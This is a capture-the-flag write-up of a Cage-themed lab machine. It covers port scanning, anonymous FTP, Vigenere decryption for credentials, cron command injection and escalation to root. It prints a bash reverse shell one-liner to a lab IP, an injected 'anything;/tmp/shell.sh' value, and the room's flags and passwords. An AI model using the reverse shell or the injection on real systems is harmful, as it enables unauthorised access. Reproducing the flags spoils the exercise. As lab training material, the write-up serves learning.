# IP
10.10.80.191

## Enumeration
### Nmap
Found 3 ports running on the system.
```console
❯ nmap -sC -sV 10.10.80.191 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-01 10:06 IST
Nmap scan report for 10.10.80.191
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.0.215
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.54 seconds
```

## Website
- There was nothing interesting in the Website, it was static.

```console
❯ curl http://10.10.80.191
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
	<title>Nicholas Cage Stories</title>
	<link rel="stylesheet" href="style.css" type="text/css" charset="utf-8" />
</head>

<body>
<div id="wrapper">
	<div id="body">
		<div id="body-top">
			<div id="body-bot">
				<div id="header">
					<img src="images/rage_cage.png" width="332" height="453" alt="Pic 1" id="person" />
					<h1><img src="images/logo.gif" width="259" height="107" alt="My Diary" /></h1>
					 <div id="about">
					  <p><span class="first-letter">T</span>his is my personal website I host from my home in, well wouldn't YOU LIKE TO KNOW?!?.</p>
	  	     	<p>My son Weston set it up for my, the boy's always been good with technology since I paid for an MIT dropout to teach him..</p>
			    	<p>I post from time to time on here about how lifes going, ya know the ups the downs the mess me arounds. But hey! I'm the Cage?
							am I right? huh!?</p>
				    <p>My agent is currently on holiday in Hawaii so not taking calls on up coming films and book signings</p>
					 </div>

					<div class="clear"></div>
					<ul>
						<li><a href="#">Home</a></li>
						<li><a href="#">About me</a></li>
						<li><a href="#">Passion</a></li>
						<li><a href="#">Hobbies</a></li>
						<li><a href="#">Profession</a></li>
						<li><a href="#">Collection</a></li>
						<li><a href="#">Contact</a></li>
					</ul>
				</div>
				<div id="tray">
					<div id="tray-left">
						<h2><img src="images/h_hobbies.gif" width="70" height="20" alt="H Hobbies" /></h2>
						<img src="images/pic_2.jpg" width="65" height="87" alt="Pic 2" class="left" />
						<p>Avid comic book fan, previous owner of a pet octopus.</p>
			    	<p>I also do films in my spare time</p>
					</div>
					<div id="tray-right">
						<h2><img src="images/h_collections.gif" width="90" height="20" alt="H Collections" /></h2>
						<img src="images/pic_3.jpg" width="299" height="87" alt="Pic 3" />
					</div>
					<div class="clear"></div>
				</div>
				<div id="footer">
					<div id="footer-right">
						<i>"I think I jump around more when I'm alone" - Nicholas Cage</i>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>


</body>
</html>

```

## Gobuster
- Found a contract directory in root folder, which further had directory `FolderNotInUse`, but it was also empty.
- Then in scripts folder there were scripts for plays :expressionless: .

```console
❯ gobuster dir --url http://10.10.80.191/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.80.191/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/01 10:17:50 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.80.191/images/]
/html                 (Status: 301) [Size: 311] [--> http://10.10.80.191/html/]  
/scripts              (Status: 301) [Size: 314] [--> http://10.10.80.191/scripts/]
/contracts            (Status: 301) [Size: 316] [--> http://10.10.80.191/contracts/]

```

## FTP
- As FTP allows Anonymous log in, logged into ftp.
- Got a file with dad_tasks file.
- Downloaded it to the local machine
```console
❯ ftp 10.10.80.191
Connected to 10.10.80.191.
220 (vsFTPd 3.0.3)
Name (10.10.80.191:divu050704): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||31485|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
229 Entering Extended Passive Mode (|||9772|)
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
100% |***************************************|   396        3.34 MiB/s    00:00 ETA
226 Transfer complete.
396 bytes received in 00:00 (2.56 KiB/s)
```
- Tried reading it but was encoded as `base64`, so decoded it.

```console
❯ cat dad_tasks
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds%                       ❯ cat dad_tasks | base64 -d
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

- This looks like a cipher so loaded this to [this](https://www.boxentriq.com/code-breaking/cipher-identifier) tool.
- This is a Vigenere Cipher.
- But we don't have passphrase.
- Tried brute-forcing it from [here](https://www.guballa.de/vigenere-solver).

```text
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

- Password for Weston seems to be `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

## Exploitation
### SSH
- Logged in with credentials of Weston.

```console
❯ ssh weston@10.10.80.191
The authenticity of host '10.10.80.191 (10.10.80.191)' can't be established.
ED25519 key fingerprint is SHA256:o7pzAxWHDEV8n+uNpDnQ+sjkkBvKP3UVlNw2MpzspBw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.80.191' (ED25519) to the list of known hosts.
weston@10.10.80.191's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov  1 04:55:52 UTC 2022

  System load:  0.0                Processes:           90
  Usage of /:   20.3% of 19.56GB   Users logged in:     0
  Memory usage: 32%                IP address for eth0: 10.10.80.191
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


         __________
        /\____;;___\
       | /         /
       `. ())oo() .
        |\(%()*^^()^\
       %| |-%-------|
      % \ | %  ))   |
      %  \|%________|
       %%%%
Last login: Tue May 26 10:58:20 2020 from 192.168.247.1
weston@national-treasure:~$ ls
weston@national-treasure:~$ pwd
/home/weston

```

- When I was searching for user flag I was prompted with message.

```text
Broadcast message from cage@national-treasure (somewhere) (Tue Nov  1 05:21:01

Guns and wine. Naughty priests. — Ghost Rider: Spirit of Vengeance

```

- This seems to be cronjob by user cage.
- Located files with owner `cage` and find two files

```console
weston@national-treasure:~$ find / -type f -user cage 2>/dev/null
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
```

- On reading this python file found out that it is having `os,system` function, this means we can execute command inside the .quotes file.

```python
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

- We have writing rights for the `.quotes` file.
- Made a shell file in `/tmp` directory

```console
weston@national-treasure:/tmp$ cat > shell.sh << EOF
> #!/bin/bash
> bash -i >& /dev/tcp/10.17.0.215/4444 0>&1
> EOF
weston@national-treasure:/tmp$ cat shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.17.0.215/4444 0>&1
```

- Gave executing rights to it.

```console
weston@national-treasure:/tmp$ chmod +x shell.sh
```
- Added this to .quotes.

```console
weston@national-treasure:/tmp$ printf 'anything;/tmp/shell.sh\n'  > /opt/.dads_scripts/.files/.quotes
```

- Got a reverse shell from user cage.
- Found user flag in  file `Super_Duper_Checklist`

```console
cage@national-treasure:~$ cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
cage@national-treasure:~$
```

## Privilege Escalation
- Found a directory `email_backup` in the home directory of `cage`.
- In the directory `email_backup` there were three mails.
- In the third mail there was a suspicious word `haiinspsyanileph`.

```console
cage@national-treasure:~/email_backup$ cat email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!!
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd.

Regards

The Legend - Cage

```

- This seems `Vigenere cypher` as you can see how cage is emphasising the word `face`, this seems to be the passphrase.
- Decyphered the word and got `cageisnotalegend` .
- Changed user to root with this password and got root access.

```console
cage@national-treasure:~/email_backup$ su root
Password:
root@national-treasure:/home/cage/email_backup# cd /root
```

- Found the root flag in `/root/email_backup/email_2`

```console
root@national-treasure:~# ls /root
email_backup
root@national-treasure:~# cd /root/email_backup/
root@national-treasure:~/email_backup# ls
email_1  email_2
root@national-treasure:~/email_backup# cat *
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

Thank you

Sean Archer

```

